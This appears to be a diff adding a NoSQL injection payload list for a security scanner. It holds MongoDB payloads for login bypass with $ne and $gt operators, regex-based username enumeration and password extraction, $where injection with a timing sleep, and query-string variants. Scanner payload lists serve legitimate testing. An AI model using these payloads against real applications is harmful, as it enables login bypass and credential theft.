@@ -1,0 +1,38 @@
+# NoSQL Injection Payloads (MongoDB) — cyberm4fia-scanner
+# Categories: Auth Bypass, Data Extraction, Operator Injection
+
+# ─── MongoDB Auth Bypass ───
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+
+# ─── Username Enumeration via Blind Regex ───
+{"username": {"$regex": "^a.*"}, "password": "x"}
+{"username": {"$regex": "^b.*"}, "password": "x"}
+{"username": {"$regex": "^admin.*"}, "password": "x"}
+
+# ─── Password Extraction (character by character) ───
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^aa"}}
+{"username": "admin", "password": {"$regex": "^ab"}}
+{"username": "admin", "password": {"$regex": "^ac"}}
+
+# ─── Operator Injection ───
+{"$gt": ""}
+{"$gt": null}
+{"$ne": ""}
+{"$regex": ".*"}
+{"$where": "1==1"}
+{"$where": "sleep(5000)"}
+
+# ─── JSON Parameter Injection ───
+username[$ne]=&password[$ne]=
+username[$regex]=.*&password[$regex]=.*
+username[$gt]=&password[$gt]=
+
+# ─── HTTP Parameter ───
+?username[$ne]=admin&password[$ne]=x
+?username[$gt]=&password[$gt]=
+?search[$regex]=.*
+?filter[$where]=1==1
